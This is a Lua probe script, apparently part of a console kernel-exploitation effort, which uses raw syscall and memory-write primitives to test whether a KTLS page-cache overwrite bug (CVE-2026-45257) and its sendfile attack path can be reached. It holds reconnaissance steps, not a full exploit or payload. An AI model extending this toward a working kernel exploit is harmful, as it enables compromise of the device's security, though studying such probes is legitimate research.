-- CRASH_CLASS: LOW
-- PROBE 50f: KTLS reachability (CVE-2026-45257)
--
-- CVE-2026-45257: KTLS receive page-cache overwrite.
-- Precondition: SOL_TLS (282) must be present.
-- Quick test: setsockopt on a TCP socket with SOL_TLS.
-- Also test: sendfile(393) reachability for the actual attack path.

print("=== PROBE 50f: KTLS REACHABILITY ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid
end

-- Install SIG_IGN for SIGSYS first
local sc_sigaction = mk(416)
local sa = memory.alloc(0x40)
for i = 0, 0x3F, 4 do wd(N(sa) + i, 0) end
pcall(function() memory.write_qword(sa, uint64(1)) end) -- SIG_IGN
pcall(function() sc_sigaction(uint64(12), sa, uint64(0)) end)
print("SIGSYS ignored")

local sc_socket = mk(97)
local sc_close = mk(6)
local sc_setsockopt = mk(105)
local sc_sendfile = mk(393)

-- SOL_TLS = 282 (Linux), but FreeBSD uses a different constant
-- On FreeBSD, TLS uses TCP_TXTLS_ENABLE=0x21 on IPPROTO_TCP=6
-- Actually the FreeBSD KTLS uses:
--   setsockopt(fd, IPPROTO_TCP, TCP_TXTLS_ENABLE, &tls, sizeof(tls))
-- Let's test both approaches
local AF_INET = 2
local SOCK_STREAM = 1
local IPPROTO_TCP = 6
local SOL_SOCKET = 0xFFFF
local TCP_TXTLS_ENABLE = 0x21   -- FreeBSD KTLS enable
local TCP_TXTLS_MODE = 0x22     -- FreeBSD KTLS mode query

-- Create TCP socket
local ok_s, fd = pcall(function()
    return sc_socket(uint64(AF_INET), uint64(SOCK_STREAM), uint64(IPPROTO_TCP))
end)
fd = ok_s and N(fd) or -999
print("TCP socket fd=" .. fd)
if fd < 0 then print("ABORT: no TCP socket") return end

-- [A] Test KTLS-related socket options
print("")
print("[A] KTLS socket options on TCP")
local val = memory.alloc(256)
local vlen = memory.alloc(16)

-- Test TCP_TXTLS_ENABLE (set)
wd(N(val), 0)
local ok, rv = pcall(function()
    return sc_setsockopt(uint64(fd), uint64(IPPROTO_TCP),
        uint64(TCP_TXTLS_ENABLE), val, uint64(4))
end)
print(string.format("  setsockopt(TCP, TXTLS_ENABLE=0x21, 0) -> %s",
    ok and tostring(N(rv)) or "PFAIL"))
if not alive() then print("DIED!") return end

-- Test TCP_TXTLS_MODE (get)
wd(N(vlen), 256)
for i = 0, 60, 4 do wd(N(val) + i, 0) end
local ok2, rv2 = pcall(function()
    return mk(118)(uint64(fd), uint64(IPPROTO_TCP),
        uint64(TCP_TXTLS_MODE), val, vlen)
end)
print(string.format("  getsockopt(TCP, TXTLS_MODE=0x22) -> %s val=%d",
    ok2 and tostring(N(rv2)) or "PFAIL", rd(N(val)) or 0))
if not alive() then print("DIED!") return end

-- [B] Try SOL_TLS=282 (Linux-style, in case Sony uses it)
print("")
print("[B] SOL_TLS=282 (Linux-style)")
wd(N(val), 0)
local ok3, rv3 = pcall(function()
    return sc_setsockopt(uint64(fd), uint64(282),
        uint64(1), val, uint64(4))
end)
print(string.format("  setsockopt(282, opt=1, 0) -> %s",
    ok3 and tostring(N(rv3)) or "PFAIL"))
if not alive() then print("DIED!") return end

-- [C] Try various TCP options to map what's available
print("")
print("[C] TCP option survey")
local tcp_opts = {
    {0x01, "TCP_NODELAY"},
    {0x02, "TCP_MAXSEG"},
    {0x04, "TCP_NOOPT"},
    {0x08, "TCP_NOPUSH"},
    {0x10, "TCP_MD5SIG"},
    {0x20, "TCP_LOG"},
    {0x21, "TCP_TXTLS_ENABLE"},
    {0x22, "TCP_TXTLS_MODE"},
    {0x23, "TCP_RXTLS_ENABLE"},
    {0x24, "TCP_RXTLS_MODE"},
    {0x40, "TCP_KEEPINIT"},
    {0x80, "TCP_INFO"},
}

for _, t in ipairs(tcp_opts) do
    local opt, label = t[1], t[2]
    wd(N(vlen), 256)
    for i = 0, 60, 4 do wd(N(val) + i, 0) end
    local gok, grv = pcall(function()
        return mk(118)(uint64(fd), uint64(IPPROTO_TCP),
            uint64(opt), val, vlen)
    end)
    if not alive() then print("  DIED on " .. label .. "!") return end
    local rval = rd(N(val)) or 0
    local rlen = rd(N(vlen)) or 0
    print(string.format("  getsockopt(TCP, 0x%02X %s) -> %s val=%d len=%d",
        opt, label, gok and tostring(N(grv)) or "PFAIL", rval, rlen))
end

-- [D] sendfile reachability
print("")
print("[D] sendfile(393) reachability")
-- sendfile(fd_out, fd_in, offset, nbytes, hdtr, sbytes, flags)
-- Just test with invalid args to see if the handler exists
local ok_sf, rv_sf = pcall(function()
    return mk(393)(uint64(fd), uint64(0), uint64(0), uint64(0),
        uint64(0), uint64(0), uint64(0))
end)
print(string.format("  sendfile(393, ...) -> %s",
    ok_sf and tostring(N(rv_sf)) or "PFAIL"))
if not alive() then print("DIED!") return end

pcall(function() sc_close(uint64(fd)) end)

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 50f COMPLETE ===")
